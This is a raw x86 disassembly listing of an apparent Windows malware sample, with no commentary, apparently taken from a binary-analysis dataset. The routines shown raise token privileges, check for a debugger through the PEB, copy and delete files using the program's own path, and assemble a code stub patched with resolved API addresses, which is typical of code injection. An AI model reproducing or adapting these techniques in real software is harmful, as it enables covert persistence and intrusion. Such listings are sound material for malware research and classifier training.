jne r-xdata
add esp 0x80
retn 0x1c
sub_410e00
push ecx
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
mov ecx [ esp ]
neg eax
sbb eax eax
and eax ecx
pop ecx
retn
sub_410e30
sub esp 0x2c
mov ecx [ esp + 0x34 ]
push ebx
push esi
lea eax [ esp + 0xc ]
push edi
push eax
push ecx
push 0x0
mov [ esp + 0x18 ] 0x10
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x3c ]
mov edi [ AdjustTokenPrivileges@IAT ]
mov [ esp + 0x2c ] edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push 0x10
push eax
push 0x0
push esi
mov [ esp + 0x40 ] 0x1
mov [ esp + 0x4c ] 0x0
call edi
mov ebx [ GetLastError@IAT ]
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x44 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x1
test eax eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x2c
retn
and al 0xfd
or al 0x2
jmp r-xdata
mov [ esp + 0x24 ] eax
mov eax [ esp + 0xc ]
push 0x0
push 0x0
lea ecx [ esp + 0x20 ]
push eax
push ecx
push 0x0
push esi
call edi
call ebx
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
add esp 0x2c
retn
sub_410f20
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
cmp [ ecx ] 0x5a4d
je r-xdata
mov edx [ ecx + 0x3c ]
add ecx edx
mov [ eax + 0x8 ] ecx
cmp [ ecx ] 0x4550
je r-xdata
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_408134
add ecx 0xf8
mov [ eax + 0xc ] ecx
retn 0x4
lea eax [ esp + 0x4 ]
push r--data
push eax
mov [ esp + 0xc ] 0x57
call sub_408134
sub_410fa0
sub esp 0x104
mov eax [ esp + 0x108 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x18 ] 0x0
call sub_406ad6
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x104
retn
push 0x2
push 0x0
push esi
call sub_4069ec
push esi
call sub_4099ad
mov ebx eax
lea ecx [ ebx + 0x1 ]
push ecx
call sub_406c98
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
cmp ebx 0x2710
lea eax [ ebx + ebx ]
jl r-xdata
push esi
call sub_406858
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
mov [ esp + 0x10 ] eax
inc eax
push eax
call sub_406c98
mov ebp eax
add esp 0x4
test ebp ebp
jne r-xdata
mov eax ebx
push 0x0
push 0x0
push esi
call sub_4069ec
push esi
push ebx
push 0x1
push edi
call sub_411a40
add esp 0x1c
cmp eax ebx
jne r-xdata
push esi
call sub_406858
push edi
call sub_406c50
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
push esi
call sub_406858
push edi
call sub_406c50
push ebp
call sub_406c50
add esp 0xc
push eax
lea edx [ esp + 0x14 ]
push edi
push edx
push ebp
call sub_40ee00
add esp 0x10
test eax eax
jl r-xdata
mov eax [ esp + 0x10 ]
push eax
push ebp
push edi
call sub_40e980
push esi
call sub_406858
mov ecx [ esp + 0x130 ]
push rw-data
push ecx
call sub_406ad6
mov ebx eax
add esp 0x18
test ebx ebx
jne r-xdata
mov edx [ esp + 0x11c ]
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_40e8d0
push ebx
push 0x4
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call sub_406b17
mov eax [ esp + 0x28 ]
lea edx [ esp + 0xac ]
push 0xa
push edx
push eax
call sub_40de4f
lea ecx [ esp + 0xb8 ]
lea edx [ esp + 0x38 ]
push ecx
push edx
call sub_40e8d0
push ebx
push 0xc
lea eax [ esp + 0x48 ]
push 0x1
push eax
call sub_406b17
push ebx
call sub_409455
mov ecx [ esp + 0x50 ]
add esp 0x40
push esi
push ecx
push 0x1
push edi
call sub_4119e0
push ebx
call sub_406858
push edi
call sub_406c50
push ebp
call sub_406c50
add esp 0x1c
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_411160
sub esp 0x110
mov eax [ esp + 0x114 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x1c ] 0x0
call sub_406ad6
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
push ebp
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call sub_4068d5
add esp 0x10
cmp eax 0x4
jne r-xdata
push ebp
call sub_406858
add esp 0x4
mov esi [ esp + 0x128 ]
lea ecx [ esp + 0x2c ]
push ecx
call sub_4068d5
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x2c ]
push edx
call sub_4068d5
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x34 ] 0x0
call sub_40e8d0
lea ecx [ esp + 0xa8 ]
push ecx
call sub_406d24
mov edx [ esp + 0x138 ]
push rw-data
push edx
mov ebx eax
call sub_406ad6
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0xa0 ]
push eax
push ecx
mov [ esp + 0x34 ] 0x0
call sub_40e8d0
lea edx [ esp + 0xa8 ]
push edx
call sub_406d24
push 0x1
push eax
push ebp
call sub_4069ec
add esp 0x18
test eax eax
jne r-xdata
lea edi [ ebx + ebx * 2 ]
shl edi 0x1
push edi
mov [ esp + 0x20 ] edi
call sub_406c98
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push ebp
push 0x4
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_4068d5
add esp 0x10
cmp eax 0x4
je r-xdata
lea ecx [ ebx + 0x1 ]
push ecx
call sub_406c98
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
push ebp
jne r-xdata
push ebp
call sub_406858
mov eax [ esp + 0x14 ]
push eax
call sub_406858
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x2c ] 0x0
call sub_40e8d0
lea ecx [ esp + 0xa8 ]
push esi
push ecx
call sub_40cbf0
add esp 0x10
test eax eax
push ebp
push 0xc
push 0x1
je r-xdata
push ebx
push 0x1
push esi
call sub_411a40
mov eax [ esp + 0x28 ]
push ebx
push esi
push eax
mov [ esi + ebx ] 0x0
call sub_40e980
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
push edi
push ecx
push esi
mov [ esp + 0x40 ] eax
call sub_40ee80
add esp 0x2c
test eax eax
jge r-xdata
call sub_406858
mov edx [ esp + 0x14 ]
push edx
call sub_406858
push esi
call sub_406c50
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
push 0x1
push esi
call sub_4119e0
push ebp
call sub_406858
push ebx
call sub_406858
push esi
call sub_406c50
push edi
call sub_406c50
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
push ebp
call sub_406858
mov edx [ esp + 0x14 ]
push edx
call sub_406858
push esi
call sub_406c50
push edi
call sub_406c50
add esp 0x10
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
sub_4113e0
sub esp 0x400
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x311 ]
mov [ esp + 0x310 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x211 ]
mov [ esp + 0x210 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] 0x0
[ edi ]
stosw [ edi ]
mov ebp [ esp + 0x41c ]
mov ebx [ esp + 0x418 ]
stosb [ edi ]
mov eax [ esp + 0x414 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x310 ]
push 0x100
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x310 ]
push edx
call sub_40e680
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x314 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ecx + ebp - 0x4 ] al
lea ecx [ esp + 0x214 ]
push ecx
push edx
call sub_40e6d0
add esp 0xc
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x210 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push ebx
call sub_40e610
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x424 ]
push esi
call sub_40e5f0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x210 ]
push ebx
push eax
call sub_40cbf0
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esp + 0x420 ]
lea edx [ esp + 0x10 ]
push esi
push ebx
push rw-data
push edx
call sub_406520
lea eax [ esp + 0x220 ]
push esi
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x130 ]
push edx
call sub_40e5f0
mov edi [ CopyFileA@IAT ]
add esp 0x24
test eax eax
je r-xdata
push ebx
call sub_4117e0
add esp 0x4
call sub_40ea10
test eax eax
je r-xdata
mov ecx [ esp + 0x420 ]
lea edx [ esp + 0x10 ]
push ecx
push ebx
push rw-data
push edx
call sub_406520
lea eax [ esp + 0x20 ]
push eax
call sub_40e5f0
add esp 0x14
test eax eax
jne r-xdata
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_406520
lea eax [ esp + 0x220 ]
push ebp
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x130 ]
push edx
call sub_40e5f0
add esp 0x24
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
mov ecx [ esp + 0x420 ]
push esi
push ecx
push ebp
push ebx
call sub_4118f0
push esi
push 0x0
call sub_40e730
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_406520
lea eax [ esp + 0x20 ]
push eax
call sub_40e5f0
add esp 0x14
test eax eax
jne r-xdata
push ebp
push ebx
lea eax [ esp + 0x18 ]
push rw-data
push eax
call sub_406520
lea ecx [ esp + 0x20 ]
push ecx
call sub_40e5f0
add esp 0x14
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push esi
call sub_411160
add esp 0xc
test eax eax
jge r-xdata
push ebp
push ebx
lea edx [ esp + 0x18 ]
push rw-data
push edx
call sub_406520
lea eax [ esp + 0x220 ]
push ebp
push eax
lea ecx [ esp + 0x128 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x130 ]
push edx
call sub_40e5f0
add esp 0x24
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
call sub_40ea10
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push esi
call sub_411160
lea eax [ esp + 0x1c ]
push eax
push 0x0
call sub_40e730
add esp 0x14
lea edx [ esp + 0x10 ]
push edx
push 0x0
call sub_40e730
add esp 0x8
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
mov edx [ esp + 0x424 ]
push edx
push esi
push ebp
push ebx
call sub_4118f0
add esp 0x10
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x114 ]
push eax
push ecx
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x400
retn
push ebp
push ebx
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x20 ]
push edx
call sub_40e5f0
add esp 0x14
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push rw-data
push esi
call sub_411160
add esp 0xc
test eax eax
jge r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
call sub_40e730
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x400
retn
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x400
retn
sub_4117e0
sub esp 0x200
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x214 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x114 ]
push ecx
call sub_4066e3
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
add esp 0x8
lea ebx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
mov ebx [ CreateDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea ebp [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebp [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
call ebx
push rw-data
push 0x0
call sub_4066e3
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_4118f0
sub esp 0x100
push ebx
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
mov ebx [ esp + 0x11c ]
[ edi ]
stosw [ edi ]
push ebx
stosb [ edi ]
call [ DeleteFileA@IAT ]
mov eax [ esp + 0x118 ]
mov esi [ esp + 0x110 ]
push eax
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x1c ]
push edx
call sub_40e5f0
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x114 ]
lea ecx [ esp + 0xc ]
push edi
push esi
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x1c ]
push edx
call sub_40e5f0
add esp 0x14
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_410fa0
add esp 0xc
push edi
push esi
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_406520
lea edx [ esp + 0x1c ]
push edx
call sub_40e5f0
add esp 0x14
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_410fa0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x100
retn
push ebx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_410fa0
add esp 0xc
sub_4119e0
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_409455
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_406b17
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
sub_411a40
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_4068d5
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
pop edi
mov eax ebp
pop esi
pop ebp
retn
sub_411aa0
sub esp 0x150
lea eax [ esp + 0x50 ]
push rw-data
push eax
call sub_40e8d0
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call sub_4066e3
add esp 0x10
test eax eax
je r-xdata
xor eax eax
add esp 0x150
retn
lea edx [ esp ]
push 0x0
push edx
push eax
call sub_412380
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x150
retn
push rw-data
push eax
call sub_4066e3
add esp 0x8
test eax eax
jne r-xdata
sub_411b10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
push eax
mov eax [ fs : 0x30 ]
movzx eax [ eax + 0x68 ]
and eax 0x70
test eax eax
je r-xdata
pop eax
mov ecx [ ebp - 0x4 ]
xor eax eax
test ecx ecx
setne al
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
sub_411b50
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
call sub_406c98
test eax eax
pop ecx
jne r-xdata
and [ eax + 0x4 ] 0x0
mov [ eax ] esi
pop esi
retn
pop esi
retn
sub_411ba1
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
mov [ ebp + 0x10 ] edi
xor ebx ebx
and [ ebp + 0x10 ] 0x3
lea esi [ ecx + eax + 0x8 ]
jne r-xdata
lea ebx [ esi + 0x1 ]
push 0x4
push 0x0
push ebx
mov [ esi ] 0x68
call sub_406580
sub edi [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
add eax edi
push eax
push ebx
call sub_4073d0
mov ecx [ ebp + 0x8 ]
add esp 0x18
lea eax [ edi - 0x4 ]
push 0x5
pop ebx
add esi ebx
lea eax [ edi - 0x4 ]
jmp r-xdata
add [ ecx + 0x4 ] ebx
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
lea ecx [ esi + 0x1 ]
lea edi [ eax + 0x4 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0xc ]
add ecx eax
shr edi 0x2
mov [ ebp + 0xc ] ecx
lea eax [ edi + ebx ]
lea ebx [ eax + edi * 4 ]
test eax eax
jl r-xdata
push 0x4
mov [ esi ] 0x68
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
call sub_4073d0
add [ ebp + 0x10 ] 0x5
sub [ ebp + 0xc ] 0x4
add esp 0xc
add esi 0x5
dec edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub_411c40
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x14 ]
mov eax [ esi + 0x4 ]
lea ecx [ eax + edi ]
cmp ecx [ esi ]
jle r-xdata
push edi
lea eax [ eax + esi + 0x8 ]
push [ esp + 0x14 ]
push eax
call sub_4073d0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
retn
sub_411c73
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
jle r-xdata
xor eax eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4084b0
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
inc [ ebp + 0x8 ]
inc esi
cmp esi [ ebp + 0xc ]
jl r-xdata
pop esi
pop ebp
retn
sub_411ca6
mov ecx [ esp + 0x8 ]
xor eax eax
push esi
lea edx [ ecx - 0x5 ]
test edx edx
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
inc eax
cmp eax edx
jl r-xdata
mov esi [ eax + ecx + 0x1 ]
cmp esi [ esp + 0x10 ]
je r-xdata
cmp [ eax + ecx ] 0xb8
jne r-xdata
pop esi
retn
mov edx [ esp + 0x14 ]
mov [ eax + ecx + 0x1 ] edx
sub_411d07
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x7f
jg r-xdata
push 0x2
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x6
cmp [ ebp + 0xc ] 0xffffff80
jb r-xdata
push 0x2
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x3
jmp r-xdata
pop eax
pop ebp
retn
sub_411d76
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x100
push 0x2
jl r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x3
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x6
jmp r-xdata
pop eax
pop ebp
retn
sub_411dc9
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x100
push 0x2
jl r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x1
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x3
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
lea eax [ ebp + 0xc ]
push 0x4
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0x18
push 0x6
jmp r-xdata
pop eax
pop ebp
retn
sub_411e1c
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x10 ] eax
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x28 ] eax
and [ ebp - 0x1c ] 0x0
push [ ebp + 0x8 ]
call sub_411cd9
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x8 ]
call sub_411cf0
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push 0x8
push [ ebp + 0x8 ]
call sub_411dc9
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411b85
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
shl eax 0x2
mov [ ebp - 0x8 ] eax
push 0xfffffffc
push [ ebp + 0x8 ]
call sub_411d07
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_411b85
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
cdq
push 0x5
pop ecx
idiv ecx
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax * 4 ]
mov [ ebp - 0x8 ] eax
push 0xfffffff8
push [ ebp + 0x8 ]
call sub_411d07
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
call sub_411f5d
mov eax [ ebp - 0x4 ]
push eax
mov eax 0x11111111
call eax
push esi
mov esi eax
cmp eax 0x0
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
mov eax [ ebp - 0x8 ]
push eax
push esi
mov eax 0x22222222
call eax
cmp eax 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
mov eax 0x33333333
call eax
call eax
sub_411f5d
nop
nop
nop
nop
nop
nop
nop
nop
pop eax
mov [ ebp - 0x14 ] eax
push 0x8
push rw-data
push 0x64
push [ ebp - 0x14 ]
call sub_411c73
add esp 0x10
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x8 ]
mov [ ebp - 0xc ] eax
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x10 ]
push 0x11111111
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_411ca6
add esp 0x10
push [ ebp - 0x28 ]
push 0x22222222
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_411ca6
add esp 0x10
push [ ebp - 0x4 ]
push 0x33333333
push [ ebp - 0x18 ]
push [ ebp - 0xc ]
call sub_411ca6
add esp 0x10
mov eax [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_411d76
pop ecx
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
push [ ebp + 0x8 ]
call sub_411d5f
pop ecx
mov ecx [ ebp - 0x1c ]
add ecx eax
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_41203a
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
jge r-xdata
cmp [ ebp + 0xc ] 0x10000
jl r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop ebp
retn
push 0x1
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
push 0x2
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
push 0x3
pop eax
push 0x1
push rw-data
push [ ebp + 0x8 ]
call sub_411c40
add esp 0xc
push 0x1
pop eax
jmp r-xdata
sub_41209b
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push rw-data
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push rw-data
push [ ebp - 0x24 ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0xc ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411b85
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
